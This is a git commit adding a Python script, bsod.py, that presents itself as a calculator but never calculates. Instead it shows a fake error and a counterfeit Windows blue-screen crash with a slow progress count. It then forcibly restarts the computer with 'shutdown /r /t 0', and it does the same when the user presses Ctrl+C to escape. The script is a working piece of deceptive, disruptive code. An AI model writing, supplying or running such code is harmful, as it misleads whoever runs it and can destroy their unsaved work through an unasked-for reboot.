c8f11f05a10e34af06454250f70be4f70caccbad
Norxthern <54279567+Norxthern@users.noreply.github.com>
2024-06-27 16:01:00 -0400

    Add files via upload

---
+++ bsod.py
@@ -0,0 +1,31 @@
+import time
+import os
+
+try: 
+    sleep = lambda x: time.sleep(x)
+    system = lambda c: os.system(c)
+
+    system('color 07')
+    print("Welcome to calculator.")
+    num1 = int(input("Enter first number: "))
+    num2 = int(input("Enter second number: "))
+    sleep(5)
+    system('cls')
+    print("Internal Server Error..")
+    sleep(3)
+    system('cls')
+    system('color 97')
+    progress = 0
+    while progress <= 100:
+        print(":(")
+        print(f"Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.\n{progress}% complete")
+        print('''           \n\nFor more information about this issue and possible fixes, visit\n           http://windows.com/stopcode\n\n           If you call a support person, give them this info:\n
+            Stop code: CRITICAL_PROCESS_DIED''')
+        sleep(2)
+        system('cls')
+        progress += 1
+    system('color 07')
+    system("shutdown /r /t 0")
+except KeyboardInterrupt:
+    input("Are you sure you want to leave?")
+    system("shutdown /r /t 0")
